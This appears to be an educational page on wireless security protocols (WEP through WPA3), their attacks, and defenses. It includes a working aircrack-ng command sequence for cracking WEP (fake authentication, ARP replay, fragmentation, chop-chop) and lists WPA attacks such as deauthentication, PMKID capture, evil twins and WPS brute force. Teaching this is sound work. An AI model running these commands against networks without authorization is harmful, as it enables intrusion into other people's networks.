Wireless Security Protocols

üîì WEP (Wired Equivalent Privacy)

  • Encryption: RC4 with 64/128-bit keys
  • Authentication: Open system or shared key
  • Vulnerabilities: IV reuse, weak keys, CRC32 flaws
  • Status: Deprecated, easily crackable
  • Attack time: Minutes to hours

üîí WPA (Wi-Fi Protected Access)

  • Encryption: TKIP (Temporal Key Integrity Protocol)
  • Authentication: Pre-shared key or 802.1X
  • Improvements: Dynamic keys, MIC protection
  • Vulnerabilities: TKIP weaknesses, dictionary attacks
  • Status: Transitional, limited deployment

üîê WPA2 (Wi-Fi Protected Access 2)

  • Encryption: AES-CCMP (Counter Mode CBC-MAC)
  • Authentication: PSK or 802.1X/EAP
  • Strengths: Strong encryption, widespread support
  • Vulnerabilities: Weak PSKs, KRACK attack
  • Status: Current standard, widely deployed

üõ°Ô∏è WPA3 (Wi-Fi Protected Access 3)

  • Encryption: AES-CCMP/GCMP with 128/192-bit
  • Authentication: SAE (Simultaneous Authentication of Equals)
  • Enhancements: Forward secrecy, brute-force protection
  • Features: Easy Connect, Enhanced Open
  • Status: Latest standard, emerging deployment

WEP Attacks

WEP Cracking Methodology

WEP Attack Process:

  1. Monitor target network for traffic
  2. Capture sufficient IV packets (typically 20,000-50,000)
  3. Optionally generate traffic to speed collection
  4. Analyze captured IVs for weak keys
  5. Recover WEP key using statistical analysis
# WEP cracking with Aircrack-ng suite # 1. Start monitoring sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 --write wep_capture # 2. Generate traffic (if needed) # Fake authentication sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon # ARP replay attack (most effective) sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon # Fragmentation attack sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF wlan0mon # Chop-chop attack sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF wlan0mon # 3. Crack the key sudo aircrack-ng wep_capture-01.cap # Alternative WEP tools # Wesside-ng (automated WEP cracking) sudo wesside-ng -i wlan0mon # Easside-ng (combined attack) sudo easside-ng wlan0mon # Manual IV analysis sudo ivstools --convert wep_capture-01.cap output.ivs sudo aircrack-ng output.ivs

WPA/WPA2 Attacks

WPA/WPA2 Attack Vectors

ü§ù 4-Way Handshake Capture

  • Monitor authentication process
  • Capture EAPOL frames
  • Deauthenticate clients to force reconnection
  • Offline dictionary/brute force attacks
  • GPU-accelerated cracking

üì° PMKID Attack

  • Exploit client-less attack vector
  • Target routers with PMKID caching
  • No client interaction required
  • Faster than handshake capture
  • Works against many modern routers

üé≠ Evil Twin Attacks

  • Create rogue access point
  • Mimic legitimate network
  • Capture credentials directly
  • Man-in-the-middle attacks
  • Social engineering integration

üîì WPS Attacks

  • PIN brute force (Reaver)
  • Pixie dust attack
  • Offline PIN recovery
  • PBC (Push Button Connect) exploitation
  • Configuration bypass

Wireless Defense and Countermeasures

Security Best Practices

üîê Access Point Security

  • Use WPA3 with strong passphrases
  • Disable WPS functionality
  • Enable MAC address filtering (if applicable)
  • Hide SSID broadcast (security through obscurity)
  • Regular firmware updates

üè¢ Enterprise Wireless

  • Implement 802.1X authentication
  • Use certificate-based EAP methods
  • Network segmentation and VLANs
  • Wireless intrusion detection systems
  • Regular security assessments

üìä Monitoring and Detection

  • Wireless IDS/IPS deployment
  • Rogue AP detection
  • Client behavior monitoring
  • Spectrum analysis
  • Security event correlation

üìã Policy and Procedures

  • Wireless security policies
  • Guest network isolation
  • BYOD security controls
  • Incident response procedures
  • User security awareness
Legal and Ethical Considerations:
  • Only test networks you own or have explicit authorization to test
  • Be aware of local radio frequency regulations
  • Avoid interfering with critical wireless communications
  • Respect privacy and data protection laws
  • Use appropriate power levels to minimize interference
  • Document all testing activities and findings
  • Follow responsible disclosure practices
Key Takeaway: Wireless security requires understanding diverse protocols, attack vectors, and defense mechanisms. Effective wireless security combines strong encryption, proper authentication, network monitoring, and regular security assessments to protect against evolving wireless threats.
